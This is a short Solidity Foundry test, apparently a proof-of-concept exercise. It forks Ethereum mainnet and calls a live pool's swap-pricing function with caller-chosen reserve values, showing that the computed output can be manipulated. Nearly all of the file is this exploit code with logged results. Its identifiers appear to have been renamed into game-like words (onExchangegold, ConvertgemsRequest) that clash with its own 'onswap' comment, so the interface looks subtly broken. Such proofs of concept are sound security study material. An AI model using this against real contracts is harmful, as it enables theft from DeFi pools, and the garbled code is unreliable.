// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

// this excersise is about direct token manipulation

interface ISpace {
    function onExchangegold(
        ConvertgemsRequest memory request,
        uint256 reservesGamecoinIn,
        uint256 reservesQuesttokenOut
    ) external returns (uint256);

    struct ConvertgemsRequest {
        IItemvault.SwaplootKind kind;
        IERC20 goldtokenIn;
        IERC20 gamecoinOut;
        uint256 amount;
        // Misc data
        bytes32 bountypoolId;
        uint256 lastChangeBlock;
        address from;
        address to;
        bytes championData;
    }
}

interface IItemvault {
    enum SwaplootKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract ContractTest is DSTest {
    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    IItemvault.SwaplootKind kind = IItemvault.SwaplootKind(0);
    ISpace.ConvertgemsRequest aad =
        ISpace.ConvertgemsRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15017009); //fork mainnet at block 15017009
    }

    function testOperation() public {
        //onswap:reservesTokenIn, reservesTokenOut;
        console.log(
            "Amount Calculated:",
            space.onExchangegold(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        ); //744039785002747962
        console.log(
            "Manipulated Amount Calculated:",
            space.onExchangegold(aad, 2000000000000000000, 2000000000000000000)
        ); //1860147027671744844
    }
}